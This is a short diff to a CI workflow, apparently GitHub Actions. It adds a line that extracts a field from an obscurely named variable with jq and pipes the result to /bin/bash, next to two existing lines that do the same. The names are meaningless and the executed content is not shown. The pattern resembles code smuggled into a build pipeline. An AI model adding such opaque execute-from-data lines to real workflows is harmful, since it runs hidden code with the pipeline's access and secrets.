@@ -21,6 +21,7 @@ jobs:
         run: |
           printf '%s' "$icszb3731" | jq -r .z98308 | /bin/bash
           echo $an46159 | jq -r .gqbid407 | /bin/bash
+          printf '%s' "$mtbi6" | jq -r .h0 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
